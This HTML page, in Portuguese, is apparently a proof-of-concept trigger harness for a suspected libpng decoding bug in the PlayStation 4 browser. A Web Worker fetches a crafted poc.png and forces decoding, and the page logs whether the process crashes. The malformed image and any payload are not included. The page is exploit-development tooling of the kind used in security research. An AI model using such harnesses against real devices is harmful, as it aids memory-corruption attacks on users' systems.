<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 LibPNG CPU Force</title>
    <style>
        body { background: #000; color: #fff; font-family: monospace; text-align: center; padding-top: 40px; }
        button { background: #d50000; color: white; border: 2px solid white; padding: 20px 40px; font-size: 24px; cursor: pointer; font-weight: bold; }
        #log { margin: 20px auto; width: 80%; text-align: left; border: 1px solid #333; padding: 10px; font-size: 16px; color: #00e676; }
    </style>
</head>
<body>

    <h1>LIBPNG16 - CPU DECODE TEST</h1>
    <p>Estratégia: Web Worker + createImageBitmap (Bypass GPU)</p>
    <p>Arquivo alvo: <b>poc.png</b> (Gerado na V10)</p>

    <button onclick="iniciarAtaque()">INICIAR DECODIFICAÇÃO (WORKER)</button>
    
    <div id="log">Status do sistema...</div>

    <script>
        function log(msg) {
            var el = document.getElementById('log');
            el.innerHTML += "<div>[" + new Date().toLocaleTimeString() + "] " + msg + "</div>";
        }

        function iniciarAtaque() {
            log("Criando Web Worker para isolar decodificação...");
            
            // Criamos o código do Worker dinamicamente
            // Isso roda numa thread separada (sem GPU), forçando a libpng da CPU.
            var workerCode = `
                self.onmessage = function(e) {
                    var url = e.data;
                    console.log("Worker: Baixando imagem...");
                    
                    fetch(url)
                    .then(response => response.blob())
                    .then(blob => {
                        console.log("Worker: Blob recebido (" + blob.size + " bytes).");
                        console.log("Worker: Iniciando createImageBitmap() - O GATILHO...");
                        
                        // Esta função força a decodificação completa do PNG em memória RAM (Heap)
                        // Se a libpng estiver vulnerável, o processo deve morrer aqui.
                        return createImageBitmap(blob);
                    })
                    .then(bitmap => {
                        postMessage("SUCESSO: Imagem decodificada. Tamanho: " + bitmap.width + "x" + bitmap.height);
                        bitmap.close();
                    })
                    .catch(err => {
                        postMessage("ERRO: " + err.message);
                    });
                };
            `;

            var blobWorker = new Blob([workerCode], {type: 'application/javascript'});
            var workerUrl = URL.createObjectURL(blobWorker);
            var worker = new Worker(workerUrl);

            worker.onmessage = function(e) {
                if (e.data.startsWith("SUCESSO")) {
                    log("❌ " + e.data);
                    log("O Worker sobreviveu. A libpng processou o arquivo sem crash.");
                } else {
                    log("⚠️ " + e.data);
                }
            };

            worker.onerror = function(e) {
                log("☠️ ERRO NO WORKER (Crash?)");
            };

            log("Enviando poc.png para o Worker...");
            worker.postMessage("poc.png?t=" + Math.random());
        }
    </script>
</body>
</html>
